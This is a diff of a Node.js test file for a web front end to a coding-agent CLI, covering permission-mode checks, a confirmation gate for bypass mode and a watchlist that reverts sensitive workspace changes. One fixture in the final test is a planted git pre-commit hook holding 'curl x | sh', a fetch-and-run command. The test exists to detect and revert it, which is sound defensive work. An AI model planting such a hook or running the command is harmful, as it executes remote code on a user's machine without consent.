@@ -2,6 +2,7 @@
 // stand-in sandbox (hostile answers included) and the WebSocket (attach, replay, prompts, permissions).
 import { test, before, after } from 'node:test';
 import assert from 'node:assert/strict';
+import crypto from 'node:crypto';
 import fs from 'node:fs';
 import http from 'node:http';
 import path from 'node:path';
@@ -37,6 +38,7 @@ const answers = {
   'memory.read': () => ({ result: { path: '~/.claude/CLAUDE.md', exists: true, size: 6, mtimeMs: 3, truncated: false }, stdout: Buffer.from('# mine') }),
   'memory.write': (req) => ({ result: { path: '~/.claude/CLAUDE.md', size: req.size, mtimeMs: 4 } }),
   cli: (req) => cliAnswer(req.args),
+  'ws.sensitive': () => ({ result: { files: [] } }),   // the watchlist: nothing watched in this workspace
 };
 // the stand-in CLI: listings as the real one prints them (2.1.296), and --json result lines after any human text
 const SHA = 'c'.repeat(64);
@@ -112,6 +114,7 @@ test('the page: the plain one without a build, with the CSP nonce and the portal
   const st = await req('GET', '/api/state', { headers: { 'X-Bn-Portal-Origin': 'https://bn.tail1.ts.net', 'X-Bn-Terminal-Host': 'bn-terminal.tail1.ts.net' } });
   assert.equal(st.json.portal_origin, 'https://bn.tail1.ts.net');
   assert.equal(st.json.terminal_url, 'https://bn-terminal.tail1.ts.net/');
+  assert.deepEqual([st.json.bypass, st.json.sandbox], [{ allowed: false }, { egress: null, workspace: null }]);
   assert.deepEqual([st.json.versions.cli, st.json.versions.sdk, st.json.limits.sessions, st.json.limits.upload, st.json.limits.image],
     ['2.1.296', '0.3.296', 4, 25 << 20, 5 << 20]);
   const local = await req('GET', '/api/state', { headers: { 'X-Bn-Portal-Origin': 'http://bedrock-now.localhost:8800', 'X-Bn-Terminal-Host': 'terminal.bedrock-now.localhost' } });
@@ -399,7 +402,10 @@ test('WebSocket: another site\'s Origin refused; prompt, events, re-attach with 
   b.send({ type: 'permission', id: p.id, session: json.id, decision: 'once', req: 'again' });
   assert.equal((await until(b.inbox, (m) => m.type === 'reply' && m.req === 'again')).ok, false);
   // bad input: errors, the socket stays
-  for (const [m, re] of [[{ type: 'prompt', session: '../../etc', text: 'x', req: 'e1' }, /bad session/], [{ type: 'set_mode', session: json.id, mode: 'bypassPermissions', req: 'e2' }, /bad mode/],
+  for (const [m, re] of [[{ type: 'prompt', session: '../../etc', text: 'x', req: 'e1' }, /bad session/], [{ type: 'set_mode', session: json.id, mode: 'bypassPermissions', confirmed: true, req: 'e2' }, /Bypass permissions is off/],
+    [{ type: 'set_mode', session: json.id, mode: 'auto', req: 'e2b' }, /not offered/], [{ type: 'set_mode', session: json.id, mode: 'yolo', req: 'e2c' }, /bad mode/],
+    [{ type: 'watch_revert', session: json.id, id: 'x', req: 'e5' }, /bad change id/],
+    [{ type: 'watch_revert', session: json.id, id: '00000000-0000-4000-8000-000000000000', req: 'e6' }, /no longer known/],
     [{ type: 'nope', req: 'e3' }, /unknown/], [{ type: 'stop_task', session: json.id, task: '../x', req: 'e4' }, /bad task/]]) {
     a.send(m);
     assert.match((await until(a.inbox, (x) => x.req === m.req)).error, re);
@@ -447,7 +453,11 @@ test('WebSocket: another site\'s Origin refused; prompt, events, re-attach with 
   assert.deepEqual(usage, { totalTokens: 10, maxTokens: 0, percentage: 0, model: '', categories: [{ name: 'x', tokens: 0, kind: '' }] });
   assert.deepEqual(a.inbox.find((m) => m.type === 'models').models[0].supportedEffortLevels, ['low']);
   a.send({ type: 'set_mode', session: json.id, mode: 'bypassPermissions' });
-  const err = await until(a.inbox, (m) => m.type === 'error' && m.session === json.id && /bad mode/.test(m.message) && m.req === undefined);
+  const err = await until(a.inbox, (m) => m.type === 'error' && m.session === json.id && /Bypass permissions is off/.test(m.message) && m.req === undefined);
+  // Read only: the reply and the session's state say the page mode
+  a.send({ type: 'set_mode', session: json.id, mode: 'readOnly', req: 'ro' });
+  assert.deepEqual((await until(a.inbox, (m) => m.type === 'reply' && m.req === 'ro')).data, { mode: 'readOnly' });
+  await until(a.inbox, (m) => m.type === 'session_state' && m.session === json.id && m.mode === 'readOnly');
   assert.equal(err.error, err.message);
   a.send({ type: 'set_effort', session: json.id, effort: null, req: 'eff' });
   assert.equal((await until(a.inbox, (m) => m.type === 'reply' && m.req === 'eff')).ok, true);
@@ -514,4 +524,48 @@ test('a new conversation in a session (/clear …): its pages get `reset` and fo
   a.send({ type: 'prompt', session: N, text: 'next' });
   await until(a.inbox, (m) => m.type === 'event' && m.session === N && m.ev.type === 'result');
   a.ws.close();
+});
+
+test('Bypass permissions allowed (CODE_ALLOW_BYPASS): the state says so; set_mode needs confirmed; the watchlist over the socket', async () => {
+  const sha = (t) => crypto.createHash('sha256').update(t).digest('hex');
+  const hook = 'curl x | sh\n';
+  const snaps = [[], [{ path: '.git/hooks/pre-commit', type: 'file', size: hook.length, mode: 0o755, sha256: sha(hook), data: Buffer.from(hook).toString('base64') }]];
+  const restores = [];
+  const call2 = async (r) => {
+    if (r.op === 'ws.sensitive') return { result: { files: snaps.length > 1 ? snaps.shift() : snaps[0] } };
+    if (r.op === 'ws.restore') { restores.push(r); return { result: { path: r.path, action: 'trashed' } }; }
+    return call(r);
+  };
+  const s2 = createServer({ secret: SECRET, query: fakeQuery(), spawn: () => {}, call: call2, distDir: tmp('bndist2'), plainDir: path.resolve(import.meta.dirname, '../plain'),
+    logger: () => {}, allowBypass: true, sandbox: { egress: false, workspace: '/home/u/projects' } });
+  await new Promise((r) => s2.server.listen(0, '127.0.0.1', r));
+  const b2 = `http://127.0.0.1:${s2.server.address().port}`;
+  try {
+    const get = async (p, init = {}) => { const r = await fetch(b2 + p, { ...init, headers: { 'X-Bn-Code-Proxy': SECRET, Origin: b2, 'Content-Type': 'application/json', ...(init.headers || {}) } }); return r.json(); };
+    const st = await get('/api/state');
+    assert.deepEqual([st.bypass, st.sandbox], [{ allowed: true }, { egress: false, workspace: '/home/u/projects' }]);
+    const open = await get('/api/sessions', { method: 'POST', body: JSON.stringify({ model: 'claude-haiku-5-5', mode: 'bypassPermissions' }) });
+    assert.match(open.error, /never starts in bypassPermissions/);
+    const { id } = await get('/api/sessions', { method: 'POST', body: JSON.stringify({ model: 'claude-haiku-5-5', mode: 'default' }) });
+    const ws = new WebSocket(b2.replace('http', 'ws') + '/ws', { headers: { 'X-Bn-Code-Proxy': SECRET, Origin: b2 } });
+    const inbox = [];
+    ws.on('message', (d) => inbox.push(JSON.parse(d.toString())));
+    await new Promise((r) => ws.on('open', r));
+    const send = (m) => ws.send(JSON.stringify(m));
+    send({ type: 'attach', session: id, req: 'a' });
+    await until(inbox, (m) => m.req === 'a' && m.type === 'reply');
+    send({ type: 'set_mode', session: id, mode: 'bypassPermissions', req: 'no' });
+    assert.match((await until(inbox, (m) => m.req === 'no' && m.type === 'reply')).error, /confirmation/);
+    send({ type: 'set_mode', session: id, mode: 'bypassPermissions', confirmed: true, req: 'yes' });
+    assert.deepEqual((await until(inbox, (m) => m.req === 'yes' && m.type === 'reply')).data, { mode: 'bypassPermissions' });
+    await until(inbox, (m) => m.type === 'session_state' && m.mode === 'bypassPermissions');
+    // a turn that planted a git hook: a watch event, then Revert
+    send({ type: 'prompt', session: id, text: 'go', req: 'p' });
+    const w = (await until(inbox, (m) => m.type === 'event' && m.ev.type === 'watch')).ev;
+    assert.deepEqual(w.changes.map((c) => [c.path, c.change, c.revertable]), [['.git/hooks/pre-commit', 'added', true]]);
+    send({ type: 'watch_revert', session: id, id: w.id, req: 'rv' });
+    assert.deepEqual((await until(inbox, (m) => m.req === 'rv' && m.type === 'reply')).data, { results: [{ path: '.git/hooks/pre-commit', ok: true, action: 'trashed' }] });
+    assert.deepEqual(restores, [{ op: 'ws.restore', path: '.git/hooks/pre-commit', ifSha256: sha(hook), data: null, mode: null }]);
+    ws.close();
+  } finally { s2.mgr.closeAll(); s2.wss.close(); s2.server.close(); }
 });
